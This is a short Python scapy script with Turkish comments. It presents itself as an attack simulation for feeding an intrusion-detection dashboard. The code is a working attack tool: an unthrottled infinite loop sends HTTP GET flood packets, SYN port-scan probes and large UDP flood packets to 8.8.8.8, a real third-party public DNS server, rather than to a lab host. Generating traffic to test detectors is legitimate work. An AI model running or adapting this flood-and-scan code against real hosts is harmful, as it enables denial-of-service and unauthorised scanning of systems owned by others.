import time
import random
import sys
from scapy.all import IP, TCP, UDP, send, Raw

# HEDEF: Rastgele Dış IP (Modemin veya Google'ın kafasını karıştıracağız)
TARGET_IP = "8.8.8.8" 

print("\n" + "!"*60)
print("⚔️  GELİŞMİŞ SALDIRI SİMÜLASYONU (DDoS Hulk & PortScan Taklidi)")
print(f"🎯 Hedef: {TARGET_IP} (Dış Trafik)")
print("!"*60 + "\n")
print("Durdurmak için CTRL+C yapın.\n")

time.sleep(2)

try:
    packet_count = 0
    while True:
        # Rastgele Portlar
        dst_port = random.randint(1, 65535)
        src_port = random.randint(1024, 65535)
        
        # --- TAKTİK 1: HULK DDoS Taklidi (HTTP GET Flood) ---
        # Model 'Payload Length' ve 'TCP Flags'e bakar.
        # User-Agent ve karmaşık URL ekleyerek gerçekçi yapıyoruz.
        http_payload = (
            f"GET /?id={random.randint(1,999999)} HTTP/1.1\r\n"
            f"Host: {TARGET_IP}\r\n"
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            "Keep-Alive: 300\r\n"
            "Connection: keep-alive\r\n\r\n"
        )
        
        # PUSH ve ACK bayraklarını kullan (Veri taşıyan paket)
        tcp_hulk = IP(dst=TARGET_IP)/TCP(sport=src_port, dport=80, flags="PA", seq=random.randint(1000,9000))/Raw(load=http_payload)
        
        # --- TAKTİK 2: PortScan (SYN Scan) ---
        # Sadece SYN bayrağı, payload yok, hızlı ve kısa.
        tcp_scan = IP(dst=TARGET_IP)/TCP(sport=src_port, dport=dst_port, flags="S")

        # --- TAKTİK 3: UDP Flood (Büyük ve Anlamsız) ---
        udp_payload = "X" * random.randint(800, 1400) # Değişken boyutta
        udp_flood = IP(dst=TARGET_IP)/UDP(sport=src_port, dport=dst_port)/Raw(load=udp_payload)

        # Paketleri Yolla (Verbose=0)
        # Hepsini aynı anda yolluyoruz ki trafik karmaşıklaşsın
        send(tcp_hulk, verbose=0)
        send(tcp_scan, verbose=0)
        send(udp_flood, verbose=0)
        
        packet_count += 3
        
        # Terminale Durum Yaz
        if packet_count % 50 == 0:
            print(f"🔥 {packet_count} Saldırı Paketi Gönderildi... -> Dashboard'a Bak!", end="\r")
        
        # Gecikmeyi neredeyse sıfıra indir (Saniyede yüzlerce paket)
        # time.sleep(0.001) yerine pass
        pass

except KeyboardInterrupt:
    print("\n\n🛑 Saldırı durduruldu.")